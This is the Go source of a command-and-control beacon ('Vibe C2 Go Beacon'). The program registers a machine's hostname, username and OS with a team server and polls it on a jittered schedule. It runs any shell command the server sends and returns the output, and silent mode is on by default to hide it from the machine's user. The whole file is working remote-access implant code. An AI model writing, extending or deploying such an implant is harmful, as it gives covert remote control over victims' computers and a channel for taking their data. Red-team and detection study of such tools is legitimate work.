package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Global variables
var debug bool
var silent bool // Silent mode - no console output
var serverURL string
var sleepTime int
var jitterPercent int
var beaconID   string
var hostname   string
var username   string
var osType     string
var ipAddress  string
var terminated bool

// Configuration variables
var (
)

// Task represents a task assigned by the team server
type Task struct {
	ID        string      `json:"id"`
	BeaconID  string      `json:"beacon_id"`
	Command   interface{} `json:"command"`
	Timestamp int64       `json:"timestamp"`
}

// BeaconRegistration represents the data sent when registering with the team server
type BeaconRegistration struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	IP       string `json:"ip"`
}

// Command from the Rust server - properly matching Rust's enum format
type Command struct {
	// The Rust Command enum gets serialized with the variant name as the key
	Shell       *string                `json:"Shell,omitempty"`
	Upload      *map[string]string     `json:"Upload,omitempty"`
	Download    *map[string]string     `json:"Download,omitempty"`
	Sleep       *map[string]uint64     `json:"Sleep,omitempty"`
	Jitter      *map[string]uint8      `json:"Jitter,omitempty"`
	Terminate   *struct{}              `json:"Terminate,omitempty"`
}

// RustCommand represents a Command enum from the Rust server
type RustCommand struct {
	Shell       *string                `json:"Shell,omitempty"`
	Upload      *map[string]string     `json:"Upload,omitempty"`
	Download    *map[string]string     `json:"Download,omitempty"`
	Sleep       *map[string]uint64     `json:"Sleep,omitempty"`
	Jitter      *map[string]uint8      `json:"Jitter,omitempty"`
	Terminate   *struct{}              `json:"Terminate,omitempty"`
}

// CommandOutput represents the output from executing a command
type CommandOutput struct {
	BeaconID string `json:"beacon_id"`
	TaskID   string `json:"task_id"`
	Output   string `json:"output"`
}

// CommandResponse represents the structure the team server expects
type CommandResponse struct {
	ID       string `json:"id"`
	BeaconID string `json:"beacon_id"`
	Result   struct {
		Success string `json:"Success"`
	} `json:"result"`
}

// Initialize beacon configuration
func init() {
	// Set default values
	rand.Seed(time.Now().UnixNano())
	hostname, _ = os.Hostname()
	username = getCurrentUser()
	osType = runtime.GOOS
	ipAddress = "unknown" // We'll get this during registration
	terminated = false
	beaconID = generateBeaconID(10)

	// Default values for flags will be set by flag.Parse()

	// Parse command line flags
	flag.StringVar(&serverURL, "server", "http://localhost:8080", "Team server URL")
	flag.IntVar(&sleepTime, "sleep", 30, "Sleep time between check-ins (in seconds)")
	flag.IntVar(&jitterPercent, "jitter", 20, "Jitter percentage for sleep time randomization (0-50)")
	flag.BoolVar(&debug, "debug", false, "Enable debug output")
	flag.BoolVar(&silent, "silent", true, "Enable silent mode (no console output)")

	// Add short form aliases
	flag.StringVar(&serverURL, "r", "http://localhost:8080", "Team server URL (shorthand)")
	flag.IntVar(&sleepTime, "s", 30, "Sleep time between check-ins (shorthand)")
	flag.IntVar(&jitterPercent, "j", 20, "Jitter percentage (shorthand)")
	flag.BoolVar(&debug, "d", false, "Enable debug output (shorthand)")
	flag.BoolVar(&silent, "q", true, "Enable silent mode (no console output) (shorthand)")

	flag.Parse()

	// Remove trailing slash from server URL if present
	serverURL = strings.TrimSuffix(serverURL, "/")
}

// Generate a random beacon ID
func generateBeaconID(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// Get current username based on OS
func getCurrentUser() string {
	if runtime.GOOS == "windows" {
		username := os.Getenv("USERNAME")
		if username != "" {
			return username
		}
	} else {
		username := os.Getenv("USER")
		if username != "" {
			return username
		}
	}
	return "unknown"
}

// ANSI color codes for nice output
const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorBlue   = "\033[34m"
	colorPurple = "\033[35m"
	colorCyan   = "\033[36m"
	colorWhite  = "\033[37m"
)

// Display a minimal banner (for debug purposes only)
func displayBanner() {
	if !silent {
		fmt.Print(colorCyan + "Vibe C2 Go Beacon v1.0.0" + colorReset + "\n\n")
	}
}

// Log helper functions
func logInfo(format string, args ...interface{}) {
	if !silent {
		fmt.Printf("[*] %s\n", fmt.Sprintf(format, args...))
	}
}

func logDebug(format string, args ...interface{}) {
	if debug && !silent {
		fmt.Printf("[🔍] %s\n", fmt.Sprintf(format, args...))
	}
}

func logError(format string, args ...interface{}) {
	if !silent {
		fmt.Printf("[❌] %s\n", fmt.Sprintf(format, args...))
	}
}

func logWarning(format string, args ...interface{}) {
	if !silent {
		fmt.Printf("[⚠️] %s\n", fmt.Sprintf(format, args...))
	}
}

func logSuccess(format string, args ...interface{}) {
	if !silent {
		fmt.Printf("[✅] %s\n", fmt.Sprintf(format, args...))
	}
}

func logMessage(icon string, color string, format string, args ...interface{}) {
	prefix := color + "[" + icon + "]" + colorReset + " "
	fmt.Printf(prefix+format+"\n", args...)
}

// Register the beacon with the team server
func registerBeacon() error {
	logInfo("Registering beacon with ID: %s", beaconID)
	
	// Create registration payload
	registration := BeaconRegistration{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		IP:       "unknown",
	}
	
	// Don't include ID in registration - let server assign one

	jsonData, err := json.Marshal(registration)
	if err != nil {
		return fmt.Errorf("error marshaling registration data: %v", err)
	}
	
	logDebug("Registration payload: %s", string(jsonData))
	
	resp, err := http.Post(serverURL+"/register", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("registration request failed: %v", err)
	}
	defer resp.Body.Close()
	
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("error reading registration response: %v", err)
	}
	
	// Debug log the response
	logDebug("Registration response (%d bytes): %s", len(respBody), string(respBody))
	
	// The server returns 200 (OK) and a quoted string as the beacon ID
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		return fmt.Errorf("registration failed with status %d: %s", resp.StatusCode, string(respBody))
	}
	
	// CRITICAL FIX: Parse the server response to get the assigned beacon ID
	// First try as JSON object with id field
	var regResponse map[string]string
	if err := json.Unmarshal(respBody, &regResponse); err == nil {
		if serverID, ok := regResponse["id"]; ok {
			// Update our beacon ID to the server-assigned one
			originalID := beaconID
			beaconID = serverID
			logSuccess("Server assigned beacon ID: %s (was: %s)", beaconID, originalID)
		}
	} else {
		// Try as a direct quoted string (which seems to be the actual format)
		var serverID string
		if err := json.Unmarshal(respBody, &serverID); err == nil {
			// Update our beacon ID to the server-assigned one
			originalID := beaconID
			beaconID = serverID
			logSuccess("Server assigned beacon ID: %s (was: %s)", beaconID, originalID)
		} else {
			// Last resort: try to use the raw response as the ID
			// Remove any quotes if present
			serverID = string(respBody)
			serverID = strings.Trim(serverID, "\"") 
			originalID := beaconID
			beaconID = serverID
			logSuccess("Using raw server response as beacon ID: %s (was: %s)", beaconID, originalID)
		}
	}

	logSuccess("Successfully registered with team server")
	return nil
}

// Check in with the team server and get tasks
func checkIn() ([]Task, error) {
	logInfo("Checking in with team server...")

	// Create check-in payload
	jsonData, err := json.Marshal(beaconID)
	if err != nil {
		return nil, fmt.Errorf("error marshaling check-in data: %v", err)
	}

	logDebug("Check-in payload: %s", string(jsonData))

	// Send check-in request
	resp, err := http.Post(serverURL+"/check_in", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, fmt.Errorf("check-in request failed: %v", err)
	}
	defer resp.Body.Close()

	// Read response
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading check-in response: %v", err)
	}

	logDebug("Raw check-in response: %s", string(bodyBytes))

	// No longer saving responses to disk (debug logs removed)
	if debug {
		logDebug("Raw response size: %d bytes", len(bodyBytes))
	}

	// Parse tasks
	var tasks []Task
	if len(bodyBytes) > 2 { // More than just "[]"
		err = json.Unmarshal(bodyBytes, &tasks)
		if err != nil {
			return nil, fmt.Errorf("error parsing tasks: %v", err)
		}
		logSuccess("Received %d task(s)", len(tasks))

		// Debug log each task details
		for i, task := range tasks {
			logDebug("Task %d: ID=%s, BeaconID=%s, Timestamp=%d", 
				i+1, task.ID, task.BeaconID, task.Timestamp)

			// Inspect the command structure
			cmdBytes, _ := json.Marshal(task.Command)
			logDebug("Task %d Command (raw): %s", i+1, string(cmdBytes))

			// Try to determine command type
			switch cmd := task.Command.(type) {
			case string:
				logDebug("Task %d has string command: %s", i+1, cmd)
			case map[string]interface{}:
				logDebug("Task %d has map command with keys: %v", i+1, keysFromMap(cmd))
			default:
				logDebug("Task %d has command of type: %T", i+1, cmd)
			}
		}
	} else {
		logInfo("No new tasks")
	}

	return tasks, nil
}

// Execute a shell command
func executeShellCommand(command string) string {
	logInfo("Executing shell command: %s", command)
	
	var cmd *exec.Cmd
	
	// Use appropriate shell based on OS
	switch runtime.GOOS {
	case "windows":
		logDebug("Using Windows shell")
		cmd = exec.Command("cmd", "/C", command)
	default:
		logDebug("Using UNIX shell")
		cmd = exec.Command("sh", "-c", command)
	}
	
	// Get command output
	output, err := cmd.CombinedOutput()
	outputStr := string(output)
	
	if err != nil {
		logError("Command execution error: %v", err)
		return fmt.Sprintf("Error: %v\n%s", err, outputStr)
	}
	
	logSuccess("Command executed successfully")
	logDebug("Command output: %s", outputStr)
	
	return outputStr
}

// Send command output back to the team server
func sendCommandOutput(taskID, output string) error {
	logInfo("Sending command output for task: %s", taskID)
	
	// Create command output payload in the format the team server expects
	data := CommandOutput{
		BeaconID: beaconID,
		TaskID:   taskID,
		Output:   output,
	}
	
	jsonData, err := json.Marshal(data)
	if err != nil {
		return fmt.Errorf("error marshaling command output: %v", err)
	}
	
	logDebug("Command output payload size: %d bytes", len(jsonData))
	logDebug("Command output payload: %s", string(jsonData))
	
	// Send to the command_output endpoint which is now Go-compatible
	resp, err := http.Post(serverURL+"/command_output", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("send command output request failed: %v", err)
	}
	defer resp.Body.Close()
	
	// Read and log the response body
	bodyBytes, _ := io.ReadAll(resp.Body)
	logDebug("Command output response: %s", string(bodyBytes))
	
	// Check response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("sending command output failed with status %d: %s", resp.StatusCode, string(bodyBytes))
	}
	
	logSuccess("Command output sent successfully to team server")
	return nil
}

// Process tasks received from the team server
func processTasks(tasks []Task) {
	logInfo("Received %d tasks from server", len(tasks))
	
	// No longer saving tasks to disk (debug logs removed)
	if debug {
		logDebug("Total tasks received: %d", len(tasks))
	}
	
	for i, task := range tasks {
		logInfo("Processing task %d/%d: %s", i+1, len(tasks), task.ID)
		
		// Dump the entire task structure for debugging
		taskJSON, _ := json.MarshalIndent(task, "", "  ")
		logDebug("Full task structure:\n%s", string(taskJSON))
		
		// Check if the command is a string (special case for Terminate)
		if cmdStr, ok := task.Command.(string); ok {
			// Handle string commands
			logDebug("Command is a direct string: %s", cmdStr)
			
			// Special handling for Terminate
			if cmdStr == "Terminate" {
				logWarning("Received terminate command (string format), shutting down...")
				sendCommandOutput(task.ID, "Beacon terminating")
				terminated = true
				return
			}
			
			// For other string commands, try to run as shell commands
			logSuccess("Executing direct string command: %s", cmdStr)
			output := executeShellCommand(cmdStr)
			sendCommandOutput(task.ID, output)
			continue
		}
		
		// MAIN APPROACH: Use map[string]interface{} for structured commands
		// This handles the standard command format the server sends
		cmdData, ok := task.Command.(map[string]interface{})
		if !ok {
			// If it's not a map or string, try to serialize and deserialize it
			cmdJSON, err := json.Marshal(task.Command)
			if err != nil {
				logError("Failed to serialize command: %v", err)
				continue
			}
			
			// Try to parse as map
			err = json.Unmarshal(cmdJSON, &cmdData)
			if err != nil {
				logError("Failed to parse command as map: %v", err)
				continue
			}
		}
		
		logDebug("Command map keys: %v", keysFromMap(cmdData))
		
		// HANDLE SHELL COMMAND
		if shellCmd, ok := cmdData["Shell"]; ok {
			// Extract the shell command string
			var shellCmdStr string
			
			switch v := shellCmd.(type) {
			case string:
				shellCmdStr = v
			default:
				logError("Shell command value is not a string: %T", shellCmd)
				continue
			}
			
			logSuccess("✓ Executing shell command: %s", shellCmdStr)
			output := executeShellCommand(shellCmdStr)
			logDebug("Command output: %s", output)
			
			err := sendCommandOutput(task.ID, output)
			if err != nil {
				logError("Failed to send command output: %v", err)
			}
			continue
		}
		
		// HANDLE SLEEP COMMAND
		if sleepData, ok := cmdData["Sleep"].(map[string]interface{}); ok {
			if secondsVal, ok := sleepData["seconds"]; ok {
				// Convert to int (handle different numeric types)
				var seconds int
				switch v := secondsVal.(type) {
				case float64:
					seconds = int(v)
				case int:
					seconds = v
				case int64:
					seconds = int(v)
				case uint64:
					seconds = int(v)
				default:
					logError("Sleep seconds is not a number: %T", secondsVal)
					continue
				}
				
				oldSleep := sleepTime
				sleepTime = seconds
				logSuccess("Sleep time changed from %d to %d seconds", oldSleep, sleepTime)
				output := fmt.Sprintf("Sleep time changed to %d seconds", sleepTime)
				sendCommandOutput(task.ID, output)
			}
			continue
		}
		
		// HANDLE JITTER COMMAND
		if jitterData, ok := cmdData["Jitter"].(map[string]interface{}); ok {
			if percentVal, ok := jitterData["percent"]; ok {
				// Convert to int (handle different numeric types)
				var percent int
				switch v := percentVal.(type) {
				case float64:
					percent = int(v)
				case int:
					percent = v
				case int64:
					percent = int(v)
				case uint8:
					percent = int(v)
				default:
					logError("Jitter percent is not a number: %T", percentVal)
					continue
				}
				
				oldJitter := jitterPercent
				jitterPercent = percent
				if jitterPercent > 50 {
					jitterPercent = 50
				}
				logSuccess("Jitter percentage changed from %d%% to %d%%", oldJitter, jitterPercent)
				output := fmt.Sprintf("Jitter percentage changed to %d%%", jitterPercent)
				sendCommandOutput(task.ID, output)
			}
			continue
		}
		
		// HANDLE TERMINATE COMMAND
		if _, ok := cmdData["Terminate"]; ok {
			logWarning("Received terminate command, shutting down...")
			sendCommandOutput(task.ID, "Beacon terminating")
			terminated = true
			return
		}
		
		// Command not recognized
		logError("⚠️ Unrecognized command format for task: %s", task.ID)
		sendCommandOutput(task.ID, "Error: Command format not recognized")
	}
}

// Helper function to extract keys from a map
func keysFromMap(m map[string]interface{}) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

// Calculate sleep time with jitter
func calculateSleepWithJitter(baseSeconds, jitterPercent int) time.Duration {
	// Ensure jitter is within reasonable bounds
	jitterPct := jitterPercent
	if jitterPct < 0 {
		jitterPct = 0
	} else if jitterPct > 50 {
		jitterPct = 50
	}

	if jitterPct <= 0 {
		return time.Duration(baseSeconds) * time.Second
	}

	// Calculate the jitter range (e.g., 20% of 30 seconds = ±6 seconds)
	jitterRange := int(float64(baseSeconds) * float64(jitterPct) / 100.0)

	// Generate a random value within the jitter range
	jitterValue := rand.Intn(jitterRange*2) - jitterRange

	// Apply jitter to base sleep time, ensuring it doesn't go below 1 second
	actualSleep := baseSeconds + jitterValue
	if actualSleep < 1 {
		actualSleep = 1
	}

	return time.Duration(actualSleep) * time.Second
}

func main() {
	displayBanner()

	// Print banner and configuration if not in silent mode
	if !silent {
		logInfo("Starting Go beacon with configuration:")
		logInfo("  Server URL: %s", serverURL)
		logInfo("  Sleep time: %d seconds", sleepTime)
		logInfo("  Jitter: %d%%", jitterPercent)
		logInfo("  Hostname: %s", hostname)
		logInfo("  Username: %s", username)
		logInfo("  OS: %s", osType)
		logInfo("  Debug mode: %t", debug)
		logInfo("  Silent mode: %t", silent)
	}

	// Register beacon with team server
	err := registerBeacon()
	if err != nil {
		logError("Registration failed: %v", err)
		os.Exit(1)
	}
	
	logInfo("Starting beacon loop (sleep: %d seconds)", sleepTime)

	// Main beacon loop
	for !terminated {
		// Calculate sleep with jitter
		actualSleepDuration := calculateSleepWithJitter(sleepTime, jitterPercent)
		actualSleepSeconds := int(actualSleepDuration / time.Second)

		if jitterPercent > 0 {
			logDebug("Sleeping for %d seconds (jittered from base %d seconds)", actualSleepSeconds, sleepTime)
		} else {
			logDebug("Sleeping for %d seconds (no jitter)", sleepTime)
		}

		time.Sleep(actualSleepDuration)

		// Check in and get tasks
		tasks, err := checkIn()
		if err != nil {
			logError("Check-in failed: %v", err)
			continue
		}

		// Process tasks if any
		if len(tasks) > 0 {
			processTasks(tasks)
		}
	}

	logInfo("Beacon terminated")
}
